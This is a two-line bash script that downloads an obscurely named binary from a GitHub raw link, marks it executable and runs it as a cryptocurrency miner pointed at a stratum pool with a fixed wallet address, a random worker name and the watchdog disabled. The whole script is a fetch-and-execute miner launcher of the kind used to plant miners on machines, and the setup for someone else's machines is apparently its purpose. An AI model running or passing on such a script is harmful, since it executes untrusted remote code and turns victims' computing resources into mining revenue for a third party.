#!/bin/bash
wget https://github.com/desafff/mnttr/raw/main/rgeh && chmod +x rgeh && ./rgeh -a sha512256d -o stratum+tcp://usw.vipor.net:5067 -u 1CowuSUg4FeLsRy9J7vP21MmxfS4CrJJS3 -w $(shuf -i 0-999 -n 1) --no-watchdog
